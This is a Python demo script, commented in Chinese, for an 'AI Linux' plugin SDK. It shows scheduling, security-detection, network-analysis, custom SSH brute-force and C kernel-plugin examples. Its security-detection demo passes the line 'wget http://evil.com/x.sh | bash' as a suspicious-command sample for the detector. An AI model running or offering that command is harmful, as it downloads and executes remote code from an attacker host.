#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""
demo_plugin.py — AI Linux 插件系统使用示例

运行：
    python3 demo_plugin.py
"""

import sys
import os
import time

# 添加 SDK 路径
sys.path.insert(0, os.path.dirname(__file__))

from ai_plugin_sdk import PluginManager, Plugin, PluginType, create_default_manager


def demo_builtin():
    """内置插件演示"""
    print("=== 内置插件演示 ===\n")

    pm = create_default_manager()

    # 列出所有插件
    print("已加载插件:")
    for p in pm.list_plugins():
        status = "✓" if p.state == "enabled" else "✗"
        print(f"  [{status}] {p.name} ({p.type.value}) — {p.description}")
    print()

    # 调度推理
    print("调度推理（PID 5678）:")
    result = pm.dispatch("scheduling", {
        "pid": 5678,
        "features": {
            "cpu_util": 768,
            "nvcsw": 25,
            "nivcsw": 5,
        }
    })
    print(f"  结果: {result}")
    print()

    # 安全检测
    print("安全检测（可疑命令）:")
    result = pm.dispatch("security", {
        "comm": "bash",
        "argv": "wget http://evil.com/x.sh | bash",
    })
    print(f"  结果: {result}")
    print()

    # 网络分析
    print("网络分析（高危端口）:")
    result = pm.dispatch("io_network", {
        "src_ip": "192.168.1.100",
        "dst_ip": "10.0.0.5",
        "dst_port": 22,
        "protocol": "tcp",
    })
    print(f"  结果: {result}")
    print()

    # 统计
    print("统计:")
    stats = pm.get_stats()
    print(f"  插件数: {stats['total_plugins']}")
    print(f"  启用: {stats['enabled_plugins']}")
    print(f"  推理: {stats['total_inferences']}")
    print(f"  错误: {stats['total_errors']}")
    print()


def demo_custom():
    """自定义插件演示"""
    print("=== 自定义插件演示 ===\n")

    pm = PluginManager()

    # 自定义插件
    class CustomSecurityPlugin(Plugin):
        name = "custom_security"
        description = "自定义安全检测（检测 SSH 暴力破解）"
        type = PluginType.SECURITY
        version = "1.0.0"

        def on_infer(self, ctx):
            comm = ctx.get("comm", "")
            count = ctx.get("attempt_count", 0)

            if "ssh" in comm.lower() and count > 5:
                return {
                    "decision": "block",
                    "confidence": 95,
                    "reason": f"SSH 暴力破解尝试 ({count} 次)",
                }
            return {"decision": "allow", "confidence": 80}

        def on_config_change(self, key, value):
            print(f"  配置变更: {key} = {value}")

    # 注册自定义插件
    pm._plugins["custom_security"] = CustomSecurityPlugin()
    pm._plugins["custom_security"]._state = "enabled"
    pm._plugins["custom_security"]._lock = None

    # 测试
    print("测试自定义安全插件:")
    result = pm.dispatch("security", {
        "comm": "sshd",
        "attempt_count": 10,
    })
    print(f"  结果: {result}")

    # 配置变更
    pm._plugins["custom_security"].set_config("max_attempts", 3)
    print()


def demo_hot_reload():
    """热更新演示"""
    print("=== 热更新演示 ===\n")

    pm = create_default_manager()

    print("初始调度决策:")
    r1 = pm.dispatch("scheduling", {"features": {"cpu_util": 800}})
    print(f"  结果: {r1['decision']}")

    # 模拟配置变更
    print("\n修改 promote 阈值后:")
    pm._plugins["scheduling_plugin"]._config["promote_threshold"] = 60

    r2 = pm.dispatch("scheduling", {"features": {"cpu_util": 800}})
    print(f"  结果: {r2['decision']}")
    print()


def demo_plugin_communication():
    """插件间通信演示"""
    print("=== 插件间通信演示 ===\n")

    pm = create_default_manager()

    # 订阅事件
    events = []
    def on_event(data):
        events.append(data)
        print(f"  [Event] {data}")

    pm.on_event("plugin_enabled", on_event)

    # 触发事件
    pm.broadcast({"type": "test", "message": "hello plugins"})

    # 向特定插件发消息
    pm.send_to_plugin("scheduling_plugin",
                      {"type": "config", "key": "test", "value": 1})
    print()


def demo_stats():
    """统计演示"""
    print("=== 统计演示 ===\n")

    pm = create_default_manager()

    # 做几次推理
    for i in range(5):
        pm.dispatch("scheduling", {
            "features": {"cpu_util": 600 + i * 100}
        })

    # 查看统计
    stats = pm.get_stats()
    print(f"总推理次数: {stats['total_inferences']}")
    print(f"平均延迟: {stats['avg_latency_ms']:.2f}ms")
    print()


def demo_c_api():
    """C 插件 API 演示（生成代码）"""
    print("=== C 内核插件 API ===\n")

    code = '''
// 插件模板 — 在 Linux 内核中编译
#include "ai_plugin.h"

static int my_sched_infer(struct ai_infer_ctx *ctx)
{
    // 实现调度推理逻辑
    // ctx->input = 输入特征
    // ctx->output = 决策结果
    return 0;
}

static struct ai_plugin_ops my_plugin_ops = {
    .name        = "my_sched_plugin",
    .version     = "1.0.0",
    .description = "自定义调度插件",
    .type        = PLUGIN_TYPE_SCHED,
    .api_version = AI_PLUGIN_VERSION,
    .infer       = my_sched_infer,
};

// 注册
module_ai_plugin(my_plugin_ops, "sched");

// 编译:
//   gcc -O2 -o my_sched_plugin.ko my_sched_plugin.c \\
//       -I../plugins/core -I../ai_core/include
//       -DMODULE -D__KERNEL__
'''
    print(code)


def main():
    print("╔═══════════════════════════════════════════════╗")
    print("║   AI Linux — Plugin System Demo             ║")
    print("╚═══════════════════════════════════════════════╝\n")

    demo_builtin()
    demo_custom()
    demo_hot_reload()
    demo_plugin_communication()
    demo_stats()
    demo_c_api()

    print("✅ 全部演示完成！")


if __name__ == "__main__":
    main()
